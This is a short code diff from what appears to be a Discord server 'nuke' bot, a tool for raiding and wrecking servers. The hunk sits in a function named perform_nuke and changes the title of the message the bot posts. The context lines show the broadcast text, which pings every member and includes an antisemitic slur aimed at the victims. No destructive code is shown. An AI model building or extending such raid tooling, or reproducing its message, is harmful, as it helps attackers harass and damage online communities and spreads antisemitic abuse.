@@ -674,7 +674,7 @@ async def perform_nuke(ctx, custom_mode: bool):
     embed_gif2 = None
     if not custom_mode:
         embed_main = discord.Embed(
-            title="**HEX EMPIRE N4KED YOUR AHH**",
+            title="**HEX || SERVER N4KED YOUR AHH**",
             description=(
                 "@everyone @here VIRTUOSO OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
                 "**# HEX || SERVER NON HOOKED**\n"
